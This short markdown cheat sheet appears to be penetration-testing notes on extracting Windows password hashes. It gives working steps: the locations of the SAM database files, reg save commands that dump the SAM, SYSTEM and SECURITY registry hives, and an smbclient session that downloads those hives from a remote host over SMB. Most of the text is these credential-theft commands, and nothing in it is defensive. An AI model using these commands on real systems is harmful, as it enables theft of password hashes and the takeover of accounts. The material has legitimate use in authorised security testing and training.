## 🔐 Windows Password Extraction and Cracking

### 🧩 Security Account Manager (SAM) Database Extraction

The SAM database stores user password hashes (NTLM, sometimes LM). It can be dumped in two modes:

- **Online:** Requires SYSTEM privileges or token
- **Offline:** Using SYSTEM and SAM hives or backups

---

### 📁 Location of SAM database files

```
%systemroot%\System32\config\SAM
C:\Windows\System32\config\SAM

```

---

### ⚙️ Commands to save registry hives for offline extraction

```bash
mkdir c:\pass

reg save hklm\sam c:\pass\sam
reg save hklm\system c:\pass\system
reg save hklm\security c:\pass\security

```

---

### 📤 Downloading dumped hives over SMB

```bash
# smbclient //192.168.1.52/pass -U win7-4

smb: \> mget sam security system

```
